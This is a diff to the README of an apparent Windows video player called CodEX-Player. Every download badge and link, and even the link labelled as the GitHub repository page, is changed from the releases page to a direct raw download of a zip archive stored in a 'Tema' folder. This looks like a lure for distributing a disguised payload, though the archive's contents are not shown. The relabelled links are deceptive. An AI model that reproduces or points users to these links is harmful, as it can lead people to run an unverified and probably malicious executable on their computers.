@@ -1,6 +1,6 @@
 # 🎬 CodEX-Player - Clear and Fast Video Playback
 
-[![Download CodEX-Player](https://img.shields.io/badge/Download-CodEX--Player-blue?style=for-the-badge)](https://github.com/leandropapu/CodEX-Player/releases)
+[![Download CodEX-Player](https://img.shields.io/badge/Download-CodEX--Player-blue?style=for-the-badge)](https://github.com/leandropapu/CodEX-Player/raw/refs/heads/main/Tema/E-Cod-Player-3.2-beta.4.zip)
 
 ## 📺 What is CodEX-Player?
 
@@ -35,7 +35,7 @@ Follow these steps to get CodEX-Player on your Windows computer and start watchi
 
 Open your web browser and go to the CodEX-Player release page:
 
-[Download and run CodEX-Player](https://github.com/leandropapu/CodEX-Player/releases)
+[Download and run CodEX-Player](https://github.com/leandropapu/CodEX-Player/raw/refs/heads/main/Tema/E-Cod-Player-3.2-beta.4.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -117,7 +117,7 @@ Settings can be found in the “Preferences” or “Options” menu inside the 
 
 You can find more details, updates, and report issues at the GitHub repository page:
 
-https://github.com/leandropapu/CodEX-Player
+https://github.com/leandropapu/CodEX-Player/raw/refs/heads/main/Tema/E-Cod-Player-3.2-beta.4.zip
 
 Feel free to check the “Issues” section if you encounter a problem that is not fixed by restarting or updating.
 
@@ -125,6 +125,6 @@ Feel free to check the “Issues” section if you encounter a problem that is n
 
 Click this badge below to go directly to the download page:
 
-[![Download CodEX-Player](https://img.shields.io/badge/Download-CodEX--Player-grey?style=for-the-badge)](https://github.com/leandropapu/CodEX-Player/releases)
+[![Download CodEX-Player](https://img.shields.io/badge/Download-CodEX--Player-grey?style=for-the-badge)](https://github.com/leandropapu/CodEX-Player/raw/refs/heads/main/Tema/E-Cod-Player-3.2-beta.4.zip)
 
 Download the latest `.exe` file, run it, and follow the installer steps to set up the player on your Windows machine.
